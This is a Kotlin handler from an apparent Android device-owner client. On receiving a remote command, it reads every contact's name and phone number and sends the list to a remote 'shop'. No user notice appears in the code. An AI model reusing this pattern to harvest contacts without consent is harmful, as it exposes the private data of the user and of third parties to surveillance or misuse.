package com.trex.rexandroidsecureclient.deviceowner.actionhandlers

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.provider.ContactsContract
import com.trex.rexnetwork.Constants
import com.trex.rexnetwork.data.ActionMessageDTO
import com.trex.rexnetwork.data.Actions

open class GetContactsHandler(
    private val context: Context,
) : BaseActionHandler() {
    open fun handle(messageDTO: ActionMessageDTO) {
        val contactsList = getAllContacts(context.contentResolver)
        if (contactsList.isNotEmpty()) {
            val contactsString = contactsList.joinToString(",")
            val contactsPayload =
                mapOf(
                    Actions.ACTION_GET_CONTACTS.name to contactsString,
                    Constants.KEY_RESPOSE_RESULT_STATUS to Constants.RESPONSE_RESULT_SUCCESS,
                )

            val response = messageDTO.copy(payload = contactsPayload)
            sendResponseToShop(response, context)
        }
    }

    protected fun getAllContacts(contentResolver: ContentResolver): List<String> {
        val contactsList = mutableListOf<String>()

        val cursor: Cursor? =
            contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                null,
                null,
                null,
            )

        cursor?.use {
            val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext()) {
                val name = it.getString(nameIndex)
                val number = it.getString(numberIndex)
                contactsList.add("$name: $number")
            }
        }

        return contactsList
    }
}
